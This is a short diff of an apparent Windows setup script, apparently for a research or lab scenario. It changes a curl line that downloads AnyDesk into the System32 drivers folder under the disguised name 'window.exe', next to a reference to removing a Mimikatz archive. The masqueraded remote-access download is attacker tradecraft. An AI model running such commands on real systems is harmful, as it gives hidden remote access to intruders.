@@ -27,4 +27,4 @@ rm mimikatz.zip
 
 # download anydesk remote desktop software
 cd "C:\Windows\System32\drivers"
-curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/AnyDesk.exe" -OutFile "window.exe"
+curl "https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/executables/AnyDesk.exe" -OutFile "window.exe"
